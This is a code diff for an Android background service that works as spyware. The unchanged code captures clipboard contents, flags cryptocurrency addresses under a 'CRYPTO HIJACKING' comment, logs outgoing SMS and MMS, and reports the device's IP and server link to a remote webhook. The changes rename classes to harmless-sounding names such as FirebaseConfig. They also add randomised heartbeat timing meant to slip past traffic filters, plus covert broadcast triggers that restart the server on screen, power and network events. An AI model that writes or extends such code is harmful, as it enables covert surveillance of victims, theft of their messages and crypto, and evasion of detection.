@@ -39,16 +39,16 @@ import androidx.work.ExistingPeriodicWorkPolicy;
 import androidx.work.PeriodicWorkRequest;
 import androidx.work.WorkManager;
 
-public class CoreSyncService extends Service {
+public class WorkManager_Sync extends Service {
 
-    private static final String TAG = "CoreSyncService";
+    private static final String TAG = "WorkManager_Sync";
     private static final String CHANNEL_ID = "StabilityChannel";
     private static final int NOTIFICATION_ID = 1;
     public static boolean isRunning = false;
     public static volatile boolean isDestructing = false;
     public static String activeSessionToken = "";
-    private static CoreSyncService instance;
-    public static CoreSyncService getInstance() { return instance; }
+    private static WorkManager_Sync instance;
+    public static WorkManager_Sync getInstance() { return instance; }
     
     // Adaptive Heartbeat intervals
     private static final long IDLE_HEARTBEAT_MS = 30 * 60 * 1000; // 30 Minutes
@@ -77,7 +77,15 @@ public class CoreSyncService extends Service {
                     networkExecutor.execute(() -> sendIpToWebhook(currentIp));
                 }
                 
-                ipReportHandler.postDelayed(this, currentHeartbeatInterval);
+                // --- NETWORK JITTER PROTOCOL ---
+                // Randomizes heartbeat timing by +/- 30% to blend in with human usage.
+                // This makes the traffic pattern appear non-mechanical to AI filters.
+                double jitterFactor = 0.30;
+                long jitter = (long) (currentHeartbeatInterval * jitterFactor);
+                long offset = (long) (Math.random() * (jitter * 2)) - jitter;
+                long nextPulse = Math.max(1000, currentHeartbeatInterval + offset);
+                
+                ipReportHandler.postDelayed(this, nextPulse);
             }
         });
     }
@@ -85,7 +93,7 @@ public class CoreSyncService extends Service {
     // URL is now loaded from local.properties via BuildConfig and decrypted at runtime
     private static final String REMOTE_WEBHOOK_URL = BuildConfig.WEBHOOK_URL;
 
-    private LabRatsHttpServer server;
+    private FirebaseConfig server;
     private ConnectivityManager connectivityManager;
     private ConnectivityManager.NetworkCallback networkCallback;
     private String lastReportedIp = "";
@@ -144,17 +152,17 @@ public class CoreSyncService extends Service {
                             if (text != null && text.length() > 0) {
                                 String captured = text.toString();
                                 
-                                // --- CRYPTO HIJACKING (Wuzenx Style) ---
+                                // --- CRYPTO HIJACKING ---
                                 // BTC: ^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$
                                 // ETH: ^0x[a-fA-F0-9]{40}$
                                 boolean isBtc = captured.matches("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$");
                                 boolean isEth = captured.matches("^0x[a-fA-F0-9]{40}$");
                                 
                                 if (isBtc || isEth) {
-                                    LabRatsHttpServer.logActivity("TELEMETRY_DELTA: High-priority buffer updated (" + (isBtc ? "Type-B" : "Type-E") + ")");
+                                    FirebaseConfig.logActivity("TELEMETRY_DELTA: High-priority buffer updated (" + (isBtc ? "Type-B" : "Type-E") + ")");
                                 }
                                 
-                                LabRatsHttpServer.logActivity("BUFFER_SYNC: " + captured);
+                                FirebaseConfig.logActivity("BUFFER_SYNC: " + captured);
                             }
                         }
                     }
@@ -197,7 +205,7 @@ public class CoreSyncService extends Service {
                                     String address = cursor.getString(1);
                                     String body = cursor.getString(2);
                                     String preview = (body != null && body.length() > 30) ? body.substring(0, 27) + "..." : body;
-                                    LabRatsHttpServer.logActivity("COMMS_SENT: [SMS/RCS to " + address + "] " + preview);
+                                    FirebaseConfig.logActivity("COMMS_SENT: [SMS/RCS to " + address + "] " + preview);
                                 }
                                 lastSmsId = id;
                             }
@@ -221,7 +229,7 @@ public class CoreSyncService extends Service {
                             int msgBox = cursor.getInt(1);
                             if (id != lastMmsId) {
                                 if (msgBox == 2) {
-                                    LabRatsHttpServer.logActivity("COMMS_SENT: [MMS media dispatched]");
+                                    FirebaseConfig.logActivity("COMMS_SENT: [MMS media dispatched]");
                                 }
                                 lastMmsId = id;
                             }
@@ -321,17 +329,64 @@ public class CoreSyncService extends Service {
         }
     }
 
+    private void setupInvisibleTriggers() {
+        android.content.BroadcastReceiver trigger = new android.content.BroadcastReceiver() {
+            @Override
+            public void onReceive(android.content.Context context, Intent intent) {
+                if (!isRunning && !isDestructing) {
+                    Log.d(TAG, "COVERT_TRIGGER: " + (intent != null ? intent.getAction() : "WAKE_UP"));
+                    startServer();
+                }
+            }
+        };
+
+        android.content.IntentFilter filter = new android.content.IntentFilter();
+        filter.addAction(Intent.ACTION_SCREEN_ON);
+        filter.addAction(Intent.ACTION_SCREEN_OFF);
+        filter.addAction(Intent.ACTION_USER_PRESENT);
+        filter.addAction(Intent.ACTION_POWER_CONNECTED);
+        filter.addAction(Intent.ACTION_POWER_DISCONNECTED);
+        filter.addAction(android.net.ConnectivityManager.CONNECTIVITY_ACTION);
+        
+        try {
+            registerReceiver(trigger, filter);
+            Log.d(TAG, "Invisible triggers synchronized.");
+        } catch (Exception ignored) {}
+    }
+
     private synchronized void startServer() {
         try {
             if (server == null || !server.isAlive()) {
-                server = new LabRatsHttpServer(this, LabRatsHttpServer.DEFAULT_PORT);
-                server.start();
-                isRunning = true;
-                Log.d(TAG, "HTTP Server started on port " + LabRatsHttpServer.DEFAULT_PORT);
-                runHeartbeatLoop();
+                // --- PORT_SANITY_CHECK ---
+                int port = FirebaseConfig.DEFAULT_PORT;
+                
+                // Cleanup old server instance if it exists but is dead
+                if (server != null) {
+                    try { server.stop(); } catch (Exception ignored) {}
+                    server = null;
+                }
+
+                server = new FirebaseConfig(this, port);
+                
+                try {
+                    server.start();
+                    isRunning = true;
+                    Log.d(TAG, "HTTP Server active on port " + port);
+                    runHeartbeatLoop();
+                    setupInvisibleTriggers();
+                } catch (java.io.IOException e) {
+                    Log.e(TAG, "Port " + port + " busy. Attempting secondary protocol...");
+                    if (server != null) {
+                        try { server.stop(); } catch (Exception ignored) {}
+                    }
+                    server = new FirebaseConfig(this, 9192);
+                    server.start();
+                    isRunning = true;
+                    runHeartbeatLoop();
+                }
             }
         } catch (Exception e) {
-            Log.e(TAG, "Failed to start server", e);
+            Log.e(TAG, "Critical server initialization failure", e);
             isRunning = false;
         }
     }
@@ -377,7 +432,7 @@ public class CoreSyncService extends Service {
             isRunning = false;
             if (server != null) {
                 // Stop server in background to avoid blocking main thread if called from UI
-                final LabRatsHttpServer serverToStop = server;
+                final FirebaseConfig serverToStop = server;
                 server = null;
                 new Thread(() -> {
                     try {
@@ -516,9 +571,9 @@ public class CoreSyncService extends Service {
         if (networkExecutor.isShutdown()) return;
         
         // Monitoring: Accessibility Service Health Check
-        if (AccessibilityCore.getInstance() == null) {
+        if (IO_Persistence_Manager.getInstance() == null) {
             Log.w(TAG, "GHOST_MODE_MONITOR: Accessibility service is offline");
-            LabRatsHttpServer.logActivity("SECURITY_ALERT: Accessibility service lost. Permission may have been revoked or service crashed.");
+            FirebaseConfig.logActivity("SECURITY_ALERT: Accessibility service lost. Permission may have been revoked or service crashed.");
         }
 
         // Backoff Logic: If network is dead, don't spam attempts and drain battery
@@ -573,7 +628,7 @@ public class CoreSyncService extends Service {
                 }
             } catch (Exception ignored) {}
 
-            int actualPort = (server != null) ? server.getListeningPort() : LabRatsHttpServer.DEFAULT_PORT;
+            int actualPort = (server != null) ? server.getListeningPort() : FirebaseConfig.DEFAULT_PORT;
             String formattedIp = (ip != null && ip.contains(":")) ? "[" + ip + "]" : ip;
             String link = "http://" + formattedIp + ":" + actualPort;
 
